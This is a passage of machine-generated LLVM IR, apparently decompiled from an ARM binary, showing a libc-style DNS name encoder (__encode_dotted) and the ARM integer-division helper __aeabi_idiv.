174, 175, 14, 176, 54, 12, 55, 56, 179, 13, 180, 181, 94, 95, 100, 101, 18, 19, 96, 97, 98, 99, 102, 103, 104, 105, 148, 149, 150, 235, 236, 278, 279, 57, 58, 269, 270, 106, 107, 276, 277, 228, 229, 59, 60, 219, 220, 61, 62, 63, 64, 65, 66, 67, 237, 238, 239, 240, 70, 71, 72, 73, 74, 75, 20 }
  uselistorder label %dec_label_pc_19ff4, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_19ffc = load i32, i32* @r4, align 4
  store i32 %v3_19ffc, i32* %stack_var_-32, align 4
  %v6_19ffc = load i32, i32* @r5, align 4
  %v9_19ffc = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1a004 = load i32, i32* @r1, align 4
  store i32 %v0_1a004, i32* %r8.global-to-local, align 4
  %v0_1a008 = load i32, i32* @r2, align 4
  store i32 %v0_1a008, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a07023 = icmp slt i8* %arg1, null
  store i1 %v1_1a07023, i1* %cpsr_n.global-to-local, align 1
  %v2_1a07024 = icmp eq i8* %arg1, null
  store i1 %v2_1a07024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a07024, label %dec_label_pc_1a088, label %dec_label_pc_1a07c

dec_label_pc_1a014:                               ; preds = %dec_label_pc_1a07c
  %v2_1a014 = call i32 @__GI_strchr(i32 %v0_1a01426, i32 46)
  store i32 %v2_1a014, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a018 = icmp slt i32 %v2_1a014, 0
  store i1 %v1_1a018, i1* %cpsr_n.global-to-local, align 1
  %v2_1a018 = icmp eq i32 %v2_1a014, 0
  store i1 %v2_1a018, i1* %cpsr_z.global-to-local, align 1
  %v0_1a01c = load i32, i32* @r4, align 4
  %v2_1a01c = sub i32 %v2_1a014, %v0_1a01c
  store i32 %v2_1a01c, i32* @r5, align 4
  br i1 %v2_1a018, label %dec_label_pc_1a024, label %dec_label_pc_1a030

dec_label_pc_1a024:                               ; preds = %dec_label_pc_1a014
  %v1_1a024 = inttoptr i32 %v0_1a01c to i8*
  %v3_1a028 = call i32 @strlen(i8* %v1_1a024)
  %sext = mul i32 %v3_1a028, 16777216
  %v1_1a02c = sdiv i32 %sext, 16777216
  store i32 %v1_1a02c, i32* @r5, align 4
  %v0_1a03c.pre = load i32, i32* @r4, align 4
  %v0_1a04c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a030

dec_label_pc_1a030:                               ; preds = %dec_label_pc_1a014, %dec_label_pc_1a024
  %v0_1a04c = phi i32 [ %v2_1a014, %dec_label_pc_1a014 ], [ %v0_1a04c.pre, %dec_label_pc_1a024 ]
  %v0_1a03c = phi i32 [ %v0_1a01c, %dec_label_pc_1a014 ], [ %v0_1a03c.pre, %dec_label_pc_1a024 ]
  %v0_1a05c = phi i32 [ %v2_1a01c, %dec_label_pc_1a014 ], [ %v1_1a02c, %dec_label_pc_1a024 ]
  %v0_1a030 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a030 = add i32 %v0_1a030, 1
  store i32 %v1_1a030, i32* %r7.global-to-local, align 4
  %v1_1a034 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a034 = sub i32 %v1_1a034, %v0_1a030
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a038 = icmp slt i32 %v0_1a05c, 0
  store i1 %v1_1a038, i1* %cpsr_n.global-to-local, align 1
  %v2_1a038 = icmp eq i32 %v0_1a05c, 0
  store i1 %v2_1a038, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a03c, i32* @r1, align 4
  %v0_1a040 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a040 = add i32 %v0_1a040, %v1_1a030
  store i32 %v2_1a040, i32* @r0, align 4
  store i32 %v0_1a05c, i32* @r2, align 4
  %v1_1a048 = add i32 %v2_1a034, -1
  store i32 %v1_1a048, i32* @r3, align 4
  %v1_1a04c = add i32 %v0_1a04c, 1
  store i32 %v1_1a04c, i32* @r4, align 4
  br i1 %v2_1a038, label %dec_label_pc_1a09c, label %dec_label_pc_1a054

dec_label_pc_1a054:                               ; preds = %dec_label_pc_1a030
  %v2_1a054 = sub i32 %v0_1a05c, %v1_1a048
  %v3_1a054 = icmp ult i32 %v0_1a05c, %v1_1a048
  %v4_1a054 = xor i32 %v1_1a048, %v0_1a05c
  %v5_1a054 = xor i32 %v2_1a054, %v0_1a05c
  %v6_1a054 = and i32 %v5_1a054, %v4_1a054
  %v7_1a054 = icmp slt i32 %v6_1a054, 0
  store i1 %v7_1a054, i1* %cpsr_v.global-to-local, align 1
  %v8_1a054 = icmp slt i32 %v2_1a054, 0
  store i1 %v8_1a054, i1* %cpsr_n.global-to-local, align 1
  %v9_1a054 = icmp eq i32 %v0_1a05c, %v1_1a048
  store i1 %v9_1a054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a054, label %dec_label_pc_1a05c, label %dec_label_pc_1a09c

dec_label_pc_1a05c:                               ; preds = %dec_label_pc_1a054
  %v1_1a05c = trunc i32 %v0_1a05c to i8
  %v4_1a05c = add i32 %v0_1a040, %v0_1a030
  %v5_1a05c = inttoptr i32 %v4_1a05c to i8*
  store i8 %v1_1a05c, i8* %v5_1a05c, align 1
  %v0_1a060 = call i32 @memcpy()
  store i32 %v0_1a060, i32* @r0, align 4
  %v0_1a064 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a064 = icmp slt i32 %v0_1a064, 0
  store i1 %v1_1a064, i1* %cpsr_n.global-to-local, align 1
  %v2_1a064 = icmp eq i32 %v0_1a064, 0
  store i1 %v2_1a064, i1* %cpsr_z.global-to-local, align 1
  %v0_1a068 = load i32, i32* @r5, align 4
  %v1_1a068 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a068 = add i32 %v1_1a068, %v0_1a068
  store i32 %v2_1a068, i32* %sl.global-to-local, align 4
  br i1 %v2_1a064, label %dec_label_pc_1a088, label %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge

dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge:  ; preds = %dec_label_pc_1a05c
  %v0_1a070.pre = load i32, i32* @r4, align 4
  store i32 %v0_1a070.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a070 = icmp slt i32 %v0_1a070.pre, 0
  store i1 %v1_1a070, i1* %cpsr_n.global-to-local, align 1
  %v2_1a070 = icmp eq i32 %v0_1a070.pre, 0
  store i1 %v2_1a070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a070, label %dec_label_pc_1a088, label %dec_label_pc_1a07c

dec_label_pc_1a07c:                               ; preds = %entry, %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge
  %v0_1a01426 = phi i32 [ %v0_1a070.pre, %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge ], [ %tmp, %entry ]
  %v5_1a090525 = phi i32 [ %v2_1a068, %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge ], [ 0, %entry ]
  %v1_1a07c = inttoptr i32 %v0_1a01426 to i8*
  %v2_1a07c = load i8, i8* %v1_1a07c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a080 = icmp eq i8 %v2_1a07c, 0
  store i1 %v2_1a080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a080, label %dec_label_pc_1a088, label %dec_label_pc_1a014

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge, %dec_label_pc_1a05c, %dec_label_pc_1a07c, %entry
  %v8_1a094 = phi i32 [ 0, %entry ], [ %v5_1a090525, %dec_label_pc_1a07c ], [ %v2_1a068, %dec_label_pc_1a05c ], [ %v2_1a068, %dec_label_pc_1a05c.dec_label_pc_1a070_crit_edge ]
  %v0_1a088 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a088 = icmp slt i32 %v0_1a088, 0
  store i1 %v1_1a088, i1* %cpsr_n.global-to-local, align 1
  %v2_1a088 = icmp eq i32 %v0_1a088, 0
  store i1 %v2_1a088, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1a088, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1a088
  %v6_1a090 = add i32 %v8_1a094, 1
  store i32 %v6_1a090, i32* @r0, align 4
  %v7_1a094 = load i32, i32* %r8.global-to-local, align 4
  %v9_1a094 = add i32 %v7_1a094, %v8_1a094
  %v10_1a094 = inttoptr i32 %v9_1a094 to i8*
  store i8 0, i8* %v10_1a094, align 1
  %v0_1a098.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1a098.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a098.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1a088, %bb
  %v2_1a098 = phi i1 [ %v2_1a098.pre, %bb ], [ false, %dec_label_pc_1a088 ]
  %v1_1a098 = phi i1 [ %v1_1a098.pre, %bb ], [ %v1_1a088, %dec_label_pc_1a088 ]
  %v0_1a098 = phi i1 [ %v0_1a098.pre, %bb ], [ %v2_1a088, %dec_label_pc_1a088 ]
  %v3_1a098 = xor i1 %v2_1a098, %v1_1a098
  %v4_1a098 = or i1 %v0_1a098, %v3_1a098
  br i1 %v4_1a098, label %dec_label_pc_1a09c, label %.dec_label_pc_1a0a0_crit_edge

.dec_label_pc_1a0a0_crit_edge:                    ; preds = %bb22
  %v1_1a0a4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1a0a0

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a054, %dec_label_pc_1a030, %bb22
  br label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %.dec_label_pc_1a0a0_crit_edge, %dec_label_pc_1a09c
  %v1_1a0a4 = phi i32 [ %v1_1a0a4.pre, %.dec_label_pc_1a0a0_crit_edge ], [ -1, %dec_label_pc_1a09c ]
  %v2_1a0a0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1a0a0, i32* @r4, align 4
  store i32 %v6_19ffc, i32* @r5, align 4
  store i32 %v9_19ffc, i32* @r6, align 4
  ret i32 %v1_1a0a4

; uselistorder directives
  uselistorder i32 %v0_1a088, { 0, 2, 1 }
  uselistorder i32 %v0_1a070.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1a064, { 1, 0 }
  uselistorder i32 %v2_1a054, { 1, 0 }
  uselistorder i32 %v1_1a048, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1a05c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1a02c, { 1, 0 }
  uselistorder i1 %v2_1a07024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 84, 85, 86, 87, 83, 26, 27, 0, 88, 89, 90, 28, 9, 92, 91, 29, 93, 94, 95, 38, 96, 97, 7, 98, 100, 39, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 115, 114, 116, 40, 118, 117, 46, 119, 41, 120, 122, 123, 121, 42, 124, 125, 44, 126, 43, 127, 128, 129, 130, 131 }
  uselistorder i32 ()* @memcpy, { 16, 15, 14, 1, 9, 8, 4, 3, 2, 23, 7, 11, 22, 21, 0, 13, 12, 20, 19, 18, 10, 17, 6, 5 }
  uselistorder i32 (i8*)* @strlen, { 14, 12, 11, 10, 9, 5, 28, 27, 13, 18, 17, 16, 29, 26, 25, 24, 22, 23, 21, 20, 19, 15, 8, 7, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6, 15, 14, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_1a0a0, { 1, 0 }
  uselistorder label %dec_label_pc_1a09c, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1a088, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a07c, { 1, 0 }
  uselistorder label %dec_label_pc_1a030, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1a0a8 = load i32, i32* @r1, align 4
  %v1_1a0a8 = icmp slt i32 %v0_1a0a8, 0
  %v2_1a0a8 = icmp eq i32 %v0_1a0a8, 0
  %v2_1a0ac = xor i32 %v0_1a0a8, %arg1
  br i1 %v2_1a0a8, label %dec_label_pc_1a1c0, label %dec_label_pc_1a0b4

dec_label_pc_1a0b4:                               ; preds = %entry
  br i1 %v1_1a0a8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a0b4
  %v2_1a0b4 = sub i32 0, %v0_1a0a8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a0b4, %bb
  %v1_1a180 = phi i32 [ %v2_1a0b4, %bb ], [ %v0_1a0a8, %dec_label_pc_1a0b4 ]
  %v1_1a0b8 = add i32 %v1_1a180, -1
  %v7_1a0b8 = icmp eq i32 %v1_1a180, 1
  br i1 %v7_1a0b8, label %dec_label_pc_1a160, label %dec_label_pc_1a0c0

dec_label_pc_1a0c0:                               ; preds = %thread-pre-split
  %v1_1a0c0 = icmp slt i32 %arg1, 0
  br i1 %v1_1a0c0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a0c0
  %v2_1a0c4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a0c0, %bb85
  %v0_1a1b4 = phi i32 [ %arg1, %dec_label_pc_1a0c0 ], [ %v2_1a0c4, %bb85 ]
  %v3_1a0c8 = icmp uge i32 %v0_1a1b4, %v1_1a180
  %v9_1a0c8 = icmp eq i32 %v0_1a1b4, %v1_1a180
  %v2_1a0cc = xor i1 %v3_1a0c8, true
  %v3_1a0cc = or i1 %v9_1a0c8, %v2_1a0cc
  br i1 %v3_1a0cc, label %dec_label_pc_1a16c, label %dec_label_pc_1a0d0

dec_label_pc_1a0d0:                               ; preds = %bb86
  %v2_1a0d0 = and i32 %v1_1a0b8, %v1_1a180
  %v4_1a0d0 = icmp eq i32 %v2_1a0d0, 0
  br i1 %v4_1a0d0, label %dec_label_pc_1a17c, label %dec_label_pc_1a0d8

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a0d0
  %v3_1a0d8 = icmp ult i32 %v1_1a180, 536870912
  br i1 %v3_1a0d8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a0d8
  %v4_1a0dc = mul i32 %v1_1a180, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a0d8, %.thread
  %v0_1a0fc.pr40.ph = phi i32 [ %v4_1a0dc, %.thread ], [ %v1_1a180, %dec_label_pc_1a0d8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a0d8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a0fc.pr40 = phi i32 [ %v4_1a0f0, %bb89 ], [ %v0_1a0fc.pr40.ph, %.preheader.preheader ]
  %v1_1a0f4 = phi i32 [ %v4_1a0f4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a0e8 = icmp ugt i32 %v0_1a0fc.pr40, 268435455
  br i1 %v2_1a0e8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a0fcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a0ec = icmp ult i32 %v0_1a0fc.pr40, %v0_1a1b4
  br i1 %v4_1a0ec, label %bb88, label %dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a0f0 = and i32 %v0_1a0fc.pr40, 268435456
  %v3_1a0f0 = icmp eq i32 %v2_1a0f0, 0
  %v4_1a0f0 = mul i32 %v0_1a0fc.pr40, 16
  br i1 %v3_1a0f0, label %bb89, label %dec_label_pc_1a0fc.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a0f4 = and i32 %v1_1a0f4, 268435456
  %v3_1a0f4 = icmp eq i32 %v2_1a0f4, 0
  %v4_1a0f4 = mul i32 %v1_1a0f4, 16
  br i1 %v3_1a0f4, label %.preheader, label %dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit

dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a10852.ph = phi i32 [ %v1_1a0f4, %bb87 ], [ %v4_1a0f4, %bb89 ]
  %v0_1a0fc.pr42.ph = phi i32 [ %v0_1a0fc.pr40, %bb87 ], [ %v4_1a0f0, %bb89 ]
  br label %dec_label_pc_1a0fcthread-pre-split.loopexit

dec_label_pc_1a0fcthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a10852 = phi i32 [ %v1_1a0f4, %.thread3 ], [ %v1_1a10852.ph, %dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit ]
  %v0_1a0fc.pr42 = phi i32 [ %v0_1a0fc.pr40, %.thread3 ], [ %v0_1a0fc.pr42.ph, %dec_label_pc_1a0fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a0fcthread-pre-split

dec_label_pc_1a0fcthread-pre-split:               ; preds = %dec_label_pc_1a0fcthread-pre-split.loopexit, %bb91
  %v1_1a10850 = phi i32 [ %v1_1a10852, %dec_label_pc_1a0fcthread-pre-split.loopexit ], [ %v3_1a108, %bb91 ]
  %v2_1a10048 = phi i32 [ %v0_1a1b4, %dec_label_pc_1a0fcthread-pre-split.loopexit ], [ %v2_1a100, %bb91 ]
  %v0_1a0fc.pr = phi i32 [ %v0_1a0fc.pr42, %dec_label_pc_1a0fcthread-pre-split.loopexit ], [ %v3_1a104, %bb91 ]
  br label %dec_label_pc_1a0fc

dec_label_pc_1a0fc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a0fc.loopexit, %dec_label_pc_1a0fcthread-pre-split
  %v1_1a108 = phi i32 [ %v1_1a10850, %dec_label_pc_1a0fcthread-pre-split ], [ %v1_1a0f4, %dec_label_pc_1a0fc.loopexit ]
  %v2_1a100 = phi i32 [ %v2_1a10048, %dec_label_pc_1a0fcthread-pre-split ], [ %v0_1a1b4, %dec_label_pc_1a0fc.loopexit ]
  %v1_1a104 = phi i32 [ %v0_1a0fc.pr, %dec_label_pc_1a0fcthread-pre-split ], [ %v4_1a0f0, %dec_label_pc_1a0fc.loopexit ]
  %v2_1a0fc = icmp slt i32 %v1_1a104, 0
  br i1 %v2_1a0fc, label %dec_label_pc_1a110, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a0fc
  %v4_1a100 = icmp ult i32 %v1_1a104, %v2_1a100
  br i1 %v4_1a100, label %bb91, label %dec_label_pc_1a110

bb91:                                             ; preds = %bb90
  %v3_1a104 = mul i32 %v1_1a104, 2
  %v2_1a108 = icmp slt i32 %v1_1a108, 0
  %v3_1a108 = mul i32 %v1_1a108, 2
  br i1 %v2_1a108, label %dec_label_pc_1a110, label %dec_label_pc_1a0fcthread-pre-split

dec_label_pc_1a110:                               ; preds = %bb90, %dec_label_pc_1a0fc, %bb91
  %v2_1a11c63 = phi i32 [ %v3_1a108, %bb91 ], [ %v1_1a108, %bb90 ], [ %v1_1a108, %dec_label_pc_1a0fc ]
  %v1_1a11455 = phi i32 [ %v3_1a104, %bb91 ], [ %v1_1a104, %bb90 ], [ %v1_1a104, %dec_label_pc_1a0fc ]
  br label %dec_label_pc_1a114

dec_label_pc_1a114:                               ; preds = %.thread13, %dec_label_pc_1a110
  %v1_1a148 = phi i32 [ %v4_1a148, %.thread13 ], [ %v2_1a11c63, %dec_label_pc_1a110 ]
  %v1_1a11c = phi i32 [ %v1_1a158, %.thread13 ], [ 0, %dec_label_pc_1a110 ]
  %v1_1a14c = phi i32 [ %v4_1a14c, %.thread13 ], [ %v1_1a11455, %dec_label_pc_1a110 ]
  %v1_1a118 = phi i32 [ %v0_1a144, %.thread13 ], [ %v0_1a1b4, %dec_label_pc_1a110 ]
  %v3_1a114 = icmp ult i32 %v1_1a118, %v1_1a14c
  br i1 %v3_1a114, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a114
  %v3_1a118 = sub i32 %v1_1a118, %v1_1a14c
  %v3_1a11c = or i32 %v1_1a11c, %v1_1a148
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a114, %bb92
  %v1_1a124 = phi i32 [ %v1_1a118, %dec_label_pc_1a114 ], [ %v3_1a118, %bb92 ]
  %v1_1a128 = phi i32 [ %v1_1a11c, %dec_label_pc_1a114 ], [ %v3_1a11c, %bb92 ]
  %v4_1a120 = udiv i32 %v1_1a14c, 2
  %v6_1a120 = icmp ult i32 %v1_1a124, %v4_1a120
  br i1 %v6_1a120, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a124 = urem i32 %v1_1a14c, 2
  %v4_1a124 = icmp eq i32 %v3_1a124, 0
  %v6_1a124 = sub i32 %v1_1a124, %v4_1a120
  br i1 %v4_1a124, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a128 = udiv i32 %v1_1a148, 2
  %v6_1a128 = or i32 %v1_1a128, %v5_1a128
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a130 = phi i32 [ %v6_1a124, %bb93 ], [ %v1_1a124, %.thread8 ], [ %v6_1a124, %bb94 ]
  %v1_1a134 = phi i32 [ %v1_1a128, %bb93 ], [ %v1_1a128, %.thread8 ], [ %v6_1a128, %bb94 ]
  %v4_1a12c = udiv i32 %v1_1a14c, 4
  %v6_1a12c = icmp ult i32 %v1_1a130, %v4_1a12c
  br i1 %v6_1a12c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a130 = and i32 %v1_1a14c, 2
  %v4_1a130 = icmp eq i32 %v3_1a130, 0
  %v6_1a130 = sub i32 %v1_1a130, %v4_1a12c
  br i1 %v4_1a130, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a134 = udiv i32 %v1_1a148, 4
  %v6_1a134 = or i32 %v1_1a134, %v5_1a134
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a13c = phi i32 [ %v6_1a130, %bb95 ], [ %v1_1a130, %.thread9 ], [ %v6_1a130, %bb96 ]
  %v1_1a140 = phi i32 [ %v1_1a134, %bb95 ], [ %v1_1a134, %.thread9 ], [ %v6_1a134, %bb96 ]
  %v4_1a138 = udiv i32 %v1_1a14c, 8
  %v6_1a138 = icmp ult i32 %v1_1a13c, %v4_1a138
  br i1 %v6_1a138, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a13c = and i32 %v1_1a14c, 4
  %v4_1a13c = icmp eq i32 %v3_1a13c, 0
  %v6_1a13c = sub i32 %v1_1a13c, %v4_1a138
  br i1 %v4_1a13c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a140 = udiv i32 %v1_1a148, 8
  %v6_1a140 = or i32 %v1_1a140, %v5_1a140
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a158 = phi i32 [ %v1_1a140, %bb97 ], [ %v1_1a140, %.thread10 ], [ %v6_1a140, %bb98 ]
  %v0_1a144 = phi i32 [ %v6_1a13c, %bb97 ], [ %v1_1a13c, %.thread10 ], [ %v6_1a13c, %bb98 ]
  %v2_1a144 = icmp eq i32 %v0_1a144, 0
  br i1 %v2_1a144, label %dec_label_pc_1a154, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a148, 16
  br i1 %tmp, label %dec_label_pc_1a154, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a148 = udiv i32 %v1_1a148, 16
  %v4_1a14c = udiv i32 %v1_1a14c, 16
  br label %dec_label_pc_1a114

dec_label_pc_1a154:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a154 = icmp slt i32 %v2_1a0ac, 0
  br i1 %v1_1a154, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a154
  %v2_1a158 = sub i32 0, %v1_1a158
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a160, %dec_label_pc_1a154, %bb100
  %v1_1a15c = phi i32 [ %v1_1a158, %dec_label_pc_1a154 ], [ %v2_1a158, %bb100 ], [ %arg1, %dec_label_pc_1a160 ], [ %v2_1a164, %bb101 ], [ %v1_1a17880, %bb103 ], [ %v2_1a174, %bb104 ]
  ret i32 %v1_1a15c

dec_label_pc_1a160:                               ; preds = %thread-pre-split
  br i1 %v1_1a0a8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a160
  %v2_1a164 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1a16c:                               ; preds = %bb86
  br i1 %v3_1a0c8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a16c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a16c, %bb102
  %v1_1a17880 = phi i32 [ %arg1, %dec_label_pc_1a16c ], [ 0, %bb102 ]
  br i1 %v9_1a0c8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a170 = ashr i32 %v2_1a0ac, 31
  %v2_1a174 = or i32 %v4_1a170, 1
  br label %.thread16

dec_label_pc_1a17c:                               ; preds = %dec_label_pc_1a0d0
  %v2_1a17c = icmp ugt i32 %v1_1a180, 65535
  br i1 %v2_1a17c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a17c
  %v2_1a180 = and i32 %v1_1a180, 32768
  %v3_1a180 = icmp eq i32 %v2_1a180, 0
  %v4_1a180 = udiv i32 %v1_1a180, 65536
  br i1 %v3_1a180, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a17c
  %v0_1a18c70 = phi i32 [ %v1_1a180, %dec_label_pc_1a17c ], [ %v4_1a180, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a190 = phi i32 [ %v0_1a18c70, %.thread19 ], [ %v4_1a180, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a18c = icmp ugt i32 %v1_1a190, 255
  br i1 %v2_1a18c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a190 = and i32 %v1_1a190, 128
  %v3_1a190 = icmp eq i32 %v2_1a190, 0
  %v4_1a190 = udiv i32 %v1_1a190, 256
  br i1 %v3_1a190, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a194 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a1a0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a194, %bb108 ]
  %v1_1a19c = phi i32 [ %v1_1a190, %bb106 ], [ %v4_1a190, %bb107 ], [ %v4_1a190, %bb108 ]
  %v2_1a198 = icmp ugt i32 %v1_1a19c, 15
  br i1 %v2_1a198, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a19c = and i32 %v1_1a19c, 8
  %v3_1a19c = icmp eq i32 %v2_1a19c, 0
  %v4_1a19c = udiv i32 %v1_1a19c, 16
  br i1 %v3_1a19c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a1a0 = add nsw i32 %v1_1a1a0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a1a8 = phi i32 [ %v1_1a1a0, %.thread20 ], [ %v1_1a1a0, %bb109 ], [ %v2_1a1a0, %bb110 ]
  %v5_1a1ac = phi i32 [ %v1_1a19c, %.thread20 ], [ %v4_1a19c, %bb109 ], [ %v4_1a19c, %bb110 ]
  %v2_1a1a4 = icmp ugt i32 %v5_1a1ac, 3
